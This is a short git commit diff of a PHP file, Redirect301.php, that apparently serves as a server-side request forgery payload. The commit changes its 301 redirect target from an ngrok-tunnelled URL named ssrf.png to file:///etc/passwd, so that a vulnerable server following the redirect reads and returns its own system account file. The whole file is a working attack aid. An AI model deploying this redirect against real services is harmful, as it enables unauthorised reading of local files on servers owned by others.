78abedb21958c051b96c16ab6439133c679d13f0
missoum1307 <missoum1307@users.noreply.github.com>
2020-11-18 11:38:01 +0100

    Update Redirect301.php

--- Redirect301.php
+++ Redirect301.php
@@ -1,5 +1,5 @@
 <?php // Permanent 301 Redirect via PHP
 	header("HTTP/1.1 301 Moved Permanently");
-	header("Location: https://c8ee79dd89a6.ngrok.io/ssrf.png");
+	header("Location: file:///etc/passwd");
 	exit();
 ?>
